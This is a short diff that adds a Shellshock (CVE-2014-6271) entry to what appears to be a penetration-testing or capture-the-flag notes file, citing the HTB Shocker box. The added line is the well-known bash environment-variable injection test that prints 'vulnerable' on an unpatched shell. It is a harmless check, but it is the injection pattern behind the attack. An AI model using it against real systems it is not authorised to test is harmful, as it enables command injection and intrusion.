@@ -731,6 +731,11 @@ httpd.serve_forever()
 ```
 
 # Shell Shock
+CVE-2014-6271
+```bash
+env x='() { :;}; echo vulnerable' bash -c "echo this is a test"
+```
+
 Example from HTB (Shocker)
 
 ## Request
